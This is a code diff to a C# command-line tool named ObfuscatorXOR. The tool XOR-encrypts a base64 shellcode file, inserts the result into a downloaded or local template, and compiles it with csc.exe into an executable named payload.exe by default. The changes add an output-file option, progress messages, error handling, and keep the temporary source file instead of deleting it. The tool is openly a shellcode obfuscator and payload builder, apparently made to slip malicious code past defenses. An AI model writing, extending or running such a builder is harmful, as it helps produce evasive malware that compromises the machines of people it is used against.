@@ -81,8 +81,9 @@ namespace ObfuscatorXOR
         public static void help()
         {
             string help = @"
-/file      shellcode file
-/key      XOR Key (Optional)
+/file       B64 shellcode file
+/key        XOR Key (Optional)
+/out        Output file Location (Optional)
 ";
             Console.WriteLine(help);
         }
@@ -92,6 +93,7 @@ namespace ObfuscatorXOR
             string base64String = "";
             string xorKey = "Sup3rS3cur3K3yfTw!";
             string filePath;
+            string outputFile = "";
 
             banner();
 
@@ -130,12 +132,25 @@ namespace ObfuscatorXOR
                 }
                 else
                 {
-                    Console.WriteLine($"[+] Using the default key: {xorKey}");
+                    Console.WriteLine($"[+] No /key supplied. Using the default key: {xorKey}");
+                }
+
+                if(arguments.ContainsKey("/out"))
+                {
+                    outputFile = arguments["/out"];
+                    if(!Path.GetExtension(outputFile).Contains(".exe"))
+                    {
+                        outputFile = $"{outputFile}.exe";
+                    }
+                }
+                else
+                {
+                    outputFile = "payload.exe";
                 }
 
                 if (!IsBase64String(base64String))
                 {
-                    Console.WriteLine("[!] Make sure that it is a base64 string");
+                    Console.WriteLine("[!] Make sure that it is a base64 encoded payload");
                 }
                 else
                 {
@@ -143,7 +158,7 @@ namespace ObfuscatorXOR
 
                     string xorEncStringB64 = Convert.ToBase64String(xorEncString);
 
-                    Console.WriteLine($"XOR encrypted text: {xorEncStringB64}");
+                    //Console.WriteLine($"XOR encrypted text: {xorEncStringB64}");
 
                     //decrypt it back
 
@@ -156,20 +171,21 @@ namespace ObfuscatorXOR
 
                     using (StreamWriter writer = new StreamWriter(fullPath))
                     {
+                        Console.WriteLine($"[+] Writing encoded base64 payload to {fullPath}");
                         writer.WriteLine(xorEncStringB64);
                     }
 
                     // Open template file
                     var parentDir = Directory.GetParent(Directory.GetCurrentDirectory()).Parent.FullName;
-                    var templateFile = Path.Combine(parentDir, "template.cs");
-                    var outputFile = Path.Combine(Directory.GetCurrentDirectory(), "output.cs");
+                    var templateFile = Path.Combine(parentDir, "templates/template.cs");
+                    var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "output.cs");
 
                     string templateFileContent = "";
 
                     // read all content
                     if (!File.Exists(templateFile)) //if file exists
                     {
-                        Console.WriteLine("[!] File does not exists, fetching online...");
+                        Console.WriteLine("[!] File does not exists in local, fetching online...");
                         ServicePointManager.Expect100Continue = true;
                         ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                         WebClient client = new WebClient();
@@ -180,6 +196,7 @@ namespace ObfuscatorXOR
                         catch
                         {
                             Console.WriteLine("[!] No internet connection");
+                            Environment.Exit(0);
                         }
                     }
                     else
@@ -189,15 +206,31 @@ namespace ObfuscatorXOR
                     // replace "string xoredB64" line
                     templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorEncStringB64).Replace("REPLACE XORKEY",xorKey);
                     // write all back into the file
-                    File.WriteAllText(outputFile, templateFileContent);
+                    try
+                    {
+                        Console.WriteLine("[+] Wrtiting shellcode to template file...");
+                        File.WriteAllText(tempFile, templateFileContent);
+                    }
+                    catch (Exception err)
+                    {
+                        Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
+                    }
 
                     //compile the code
-                    string strCmd = @"/c C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:payload.exe " + outputFile;
-                    System.Diagnostics.Process.Start("CMD.exe", strCmd);
+                    string strCmd = $"/c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:{outputFile} {tempFile}";
+                    try
+                    {
+                        System.Diagnostics.Process.Start("CMD.exe", strCmd);
+                        Console.WriteLine("[+] Executable file successfully generated.");
+                    }
+                    catch (Exception err)
+                    {
+                        Console.WriteLine($"[!] Error generating executable file with the following error {err.Message}");
+                    }
 
                     Console.WriteLine($"[+] Doing some cleaning...");
                     Thread.Sleep(1000);
-                    File.Delete(outputFile);
+                    //File.Delete(tempFile);
                 }
             }
 
